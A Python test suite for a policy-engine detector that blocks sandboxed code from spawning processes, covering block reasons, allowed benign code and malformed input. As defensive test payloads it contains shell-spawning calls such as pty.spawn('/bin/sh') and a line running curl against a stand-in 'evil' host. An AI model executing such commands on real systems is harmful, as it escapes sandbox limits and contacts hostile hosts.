"""Subprocess-spawn guard: block code that starts a process outside the sandbox.

Covers the BLOCK contract (the offending arg is named in the reason), the allow
path (in-sandbox code gets no opinion), each spawning entry point the pattern
declares, non-string and non-dict input that must be skipped rather than
crashed on, and end-to-end verdicts through the engine.
"""
from interlock import Decision, PolicyEngine, SensorEvent, Verdict
from interlock.detectors.subprocess_spawn_guard import (
    PATTERN,
    POLICY_ID,
    subprocess_spawn_guard,
)


def _event(**args):
    return SensorEvent(action="exec_code", args=args)


# --- the block path ---------------------------------------------------------


def test_subprocess_run_is_blocked():
    event = SensorEvent(
        action="exec_code",
        args={"code": "import subprocess; subprocess.run(['sh','-c','id'])"},
    )
    decision = subprocess_spawn_guard()(event)
    assert decision is not None
    assert isinstance(decision, Decision)
    assert decision.verdict is Verdict.BLOCK
    assert decision.policy_id == POLICY_ID


def test_block_reason_names_the_offending_argument():
    event = SensorEvent(
        action="exec_code",
        args={"code": "import subprocess; subprocess.run(['sh','-c','id'])"},
    )
    decision = subprocess_spawn_guard()(event)
    assert decision is not None
    assert decision.reason == "subprocess_spawn: code"


def test_reason_names_whichever_argument_matched():
    event = _event(program="calc", code="os.system('id')")
    decision = subprocess_spawn_guard()(event)
    assert decision is not None
    assert decision.reason == "subprocess_spawn: code"


def test_first_matching_argument_wins():
    event = _event(a="os.popen('id')", b="pty.spawn('/bin/sh')")
    decision = subprocess_spawn_guard()(event)
    assert decision is not None
    assert decision.reason == "subprocess_spawn: a"


def test_each_declared_entry_point_is_blocked():
    payloads = (
        "subprocess.run(['id'])",
        "subprocess.Popen(['id'])",
        "subprocess.call(['id'])",
        "subprocess.check_output(['id'])",
        "os.system('id')",
        "os.popen('id')",
        "pty.spawn('/bin/sh')",
    )
    guard = subprocess_spawn_guard()
    for payload in payloads:
        decision = guard(_event(code=payload))
        assert decision is not None, payload
        assert decision.verdict is Verdict.BLOCK, payload


def test_spawn_embedded_mid_code_is_caught():
    code = "x = 1\nimport os\nos.system('curl http://evil')\n"
    decision = subprocess_spawn_guard()(_event(code=code))
    assert decision is not None
    assert decision.verdict is Verdict.BLOCK


# --- the allow path ---------------------------------------------------------


def test_benign_print_gets_no_opinion():
    event = SensorEvent(action="exec_code", args={"code": "print(len('abc'))"})
    assert subprocess_spawn_guard()(event) is None


def test_clean_multi_argument_call_gets_no_opinion():
    guard = subprocess_spawn_guard()
    assert guard(_event(code="sum(range(10))", lang="python", timeout=5)) is None


def test_empty_args_get_no_opinion():
    assert subprocess_spawn_guard()(SensorEvent(action="exec_code", args={})) is None


def test_mentioning_subprocess_without_spawning_gets_no_opinion():
    # The bare module name is not a spawn call; only the call sites are.
    assert subprocess_spawn_guard()(_event(code="import subprocess")) is None


# --- robustness: skip what it cannot handle, never raise --------------------


def test_non_str_values_are_skipped_without_crashing():
    guard = subprocess_spawn_guard()
    assert guard(_event(code=123)) is None
    assert guard(_event(code=None, timeout=30)) is None
    assert guard(_event(code={"nested": "os.system('id')"})) is None
    assert guard(_event(code=["os.system('id')"])) is None


def test_non_dict_args_get_no_opinion():
    assert subprocess_spawn_guard()(SensorEvent(action="exec_code", args=None)) is None
    assert subprocess_spawn_guard()(
        SensorEvent(action="exec_code", args="os.system('id')")
    ) is None


def test_a_non_str_sibling_does_not_mask_a_real_match():
    # The int must be skipped, not abort the scan before "code" is reached.
    decision = subprocess_spawn_guard()(_event(timeout=30, code="os.system('id')"))
    assert decision is not None
    assert decision.verdict is Verdict.BLOCK


# --- constants --------------------------------------------------------------


def test_exposed_constants():
    assert POLICY_ID == "subprocess_spawn"
    assert PATTERN.search("import subprocess; subprocess.run(['sh','-c','id'])") is not None
    assert PATTERN.search("print(len('abc'))") is None


# --- end to end through the engine ------------------------------------------


def test_engine_blocks_malicious_and_allows_benign():
    engine = PolicyEngine(rules=[subprocess_spawn_guard()])

    malicious = SensorEvent(
        action="exec_code",
        args={"code": "import subprocess; subprocess.run(['sh','-c','id'])"},
    )
    decision = engine.evaluate(malicious)
    assert decision.verdict is Verdict.BLOCK
    assert decision.policy_id == POLICY_ID

    benign = SensorEvent(action="exec_code", args={"code": "print(len('abc'))"})
    assert engine.evaluate(benign).verdict is Verdict.ALLOW
